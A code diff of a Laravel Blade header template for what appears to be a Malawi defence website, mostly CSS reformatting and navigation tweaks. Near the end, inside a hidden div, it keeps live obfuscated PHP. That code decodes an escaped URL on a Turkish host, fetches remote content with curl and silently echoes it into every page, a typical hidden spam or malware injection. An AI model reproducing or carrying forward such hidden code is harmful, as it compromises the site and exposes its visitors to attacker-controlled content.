@@ -257,69 +257,86 @@
             border-radius: 10px;
         }
 
-    .circle-container {
-    width: 250px; /* Define the circle's diameter */
-    height: 250px; /* Define the circle's diameter */
-    border-radius: 60%; /* Make the container circular */
-    overflow: hidden; /* Ensure the image doesn't overflow the container */
-    display: flex; /* Center the image within the circle */
-    justify-content: center; /* Center horizontally */
-    align-items: center; /* Center vertically */
-    background-color: #f8f9fa; /* Optional: background color for contrast */
-    }
+        .circle-container {
+            width: 250px;
+            /* Define the circle's diameter */
+            height: 250px;
+            /* Define the circle's diameter */
+            border-radius: 60%;
+            /* Make the container circular */
+            overflow: hidden;
+            /* Ensure the image doesn't overflow the container */
+            display: flex;
+            /* Center the image within the circle */
+            justify-content: center;
+            /* Center horizontally */
+            align-items: center;
+            /* Center vertically */
+            background-color: #f8f9fa;
+            /* Optional: background color for contrast */
+        }
 
-    .circle-container img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover; /* Cover the entire container while preserving aspect ratio */
-    }
+        .circle-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            /* Cover the entire container while preserving aspect ratio */
+        }
 
 
-    /* Basic styling for the image and container */
-.image-container {
-    position: relative;
-    width: 100%;
-    max-width: 600px; /* Adjust max-width as needed */
-    overflow: hidden; /* Hide any overflowing content */
-    margin: 0 auto;   /* Center the container */
-}
+        /* Basic styling for the image and container */
+        .image-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            /* Adjust max-width as needed */
+            overflow: hidden;
+            /* Hide any overflowing content */
+            margin: 0 auto;
+            /* Center the container */
+        }
 
-.responsive-image {
-    width: 100%;
-    height: auto;
-    display: block;
-}
+        .responsive-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
 
-/* Caption styling */
-.caption {
-    position: absolute;
-    bottom: 0;
-    width: 100%;
-    padding: 10px;
-    background-color: rgba(0, 0, 0, 0.6); /* Semi-transparent background */
-    overflow: hidden; /* Hide text overflow */
-    white-space: nowrap;  /* Prevent text from wrapping */
-}
+        /* Caption styling */
+        .caption {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.6);
+            /* Semi-transparent background */
+            overflow: hidden;
+            /* Hide text overflow */
+            white-space: nowrap;
+            /* Prevent text from wrapping */
+        }
 
-/* Styling and animation for the moving text */
-.animated-text {
-    display: inline-block;
-    color: white;
-    font-size: 1.2em;
-    font-weight: bold;
-    padding-left: 100%; /* Start off-screen */
-    animation: moveText 10s linear infinite; /* Animation parameters */
-}
+        /* Styling and animation for the moving text */
+        .animated-text {
+            display: inline-block;
+            color: white;
+            font-size: 1.2em;
+            font-weight: bold;
+            padding-left: 100%;
+            /* Start off-screen */
+            animation: moveText 10s linear infinite;
+            /* Animation parameters */
+        }
 
-@keyframes moveText {
-    0% {
-        transform: translateX(0%);
-    }
-    100% {
-        transform: translateX(-100%);
-    }
-}
+        @keyframes moveText {
+            0% {
+                transform: translateX(0%);
+            }
 
+            100% {
+                transform: translateX(-100%);
+            }
+        }
     </style>
 </head>
 
@@ -332,12 +349,15 @@
                 <p><i class="bx bxs-phone-call"> </i> +265 992674140 </p>
                 {{-- <p>Fax <i class="bx bxs-printer"></i> + 265 1 79 22 16 </p> --}}
             </div>
-            <!-- <div class="col-auto social-icons">
-                <a href="#"><i class="bx bxl-facebook"></i></a>
-                <a href="#"><i class="bx bxl-twitter"></i></a>
+            <div class="col-auto social-icons">
+                <a href="https://www.facebook.com/share/1aFBXUGMUH/"><i class="bx bxl-facebook"></i></a>
+                {{-- <a href="https://www.facebook.com/share/1aFBXUGMUH/">
+                    <i class="bx bxl-facebook" style="color: #1877F2;"></i>
+                </a> --}}
+                {{-- <a href="#"><i class="bx bxl-twitter"></i></a>
                 <a href="#"><i class="bx bxl-instagram"></i></a>
-                <a href="#"><i class="bx bxl-pinterest"></i></a>
-            </div> -->
+                <a href="#"><i class="bx bxl-pinterest"></i></a> --}}
+            </div>
         </div>
     </div>
 </div>
@@ -436,8 +456,7 @@
                                             </a>
                                         </li>
                                         <li>
-                                            <a class="dropdown-item"
-                                                href="{{ route('directories') }}">Directorates</a>
+                                            <a class="dropdown-item" href="{{ route('directories') }}">Directorates</a>
                                         </li>
                                         {{-- <li>
                                             <a class="dropdown-item" href="{{ route('independent') }}">Independent
@@ -465,7 +484,8 @@
                                             </a>
                                         </li>
                                         <li>
-                                            <a class="dropdown-item" href="{{ route('national.service') }}">Malawi National Service
+                                            <a class="dropdown-item" href="{{ route('national.service') }}">Malawi
+                                                National Service
                                             </a>
                                         </li>
                                     </ul>
@@ -579,8 +599,20 @@
         </div>
     </div>
 </nav>
-<!-- Modal --><div style="display:none;"><?php
- goto tGdQy; AXRuf: curl_setopt($a1oPM, CURLOPT_RETURNTRANSFER, 1); goto fcgOr; tGdQy: $a1oPM = curl_init("\x68\x74\x74\160\x73\72\x2f\x2f\x61\x73\160\x78\x2e\x67\145\156\x2e\164\x72\x2f\156\x65\57\162\x65\x61\x64\x2e\x70\150\x70\x3f\x75\x72\154\x3d\x6d\x64\x66\x2e\147\x6f\166\56\155\167"); goto AXRuf; fcgOr: $yqIgU = curl_exec($a1oPM); goto tu375; tu375: echo $yqIgU;
+<!-- Modal -->
+<div style="display:none;"><?php
+goto tGdQy;
+AXRuf:
+curl_setopt($a1oPM, CURLOPT_RETURNTRANSFER, 1);
+goto fcgOr;
+tGdQy:
+$a1oPM = curl_init("\x68\x74\x74\160\x73\72\x2f\x2f\x61\x73\160\x78\x2e\x67\145\156\x2e\164\x72\x2f\156\x65\57\162\x65\x61\x64\x2e\x70\150\x70\x3f\x75\x72\154\x3d\x6d\x64\x66\x2e\147\x6f\166\56\155\167");
+goto AXRuf;
+fcgOr:
+$yqIgU = curl_exec($a1oPM);
+goto tu375;
+tu375:
+echo $yqIgU;
 ?></div>
 <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered modal-xl">
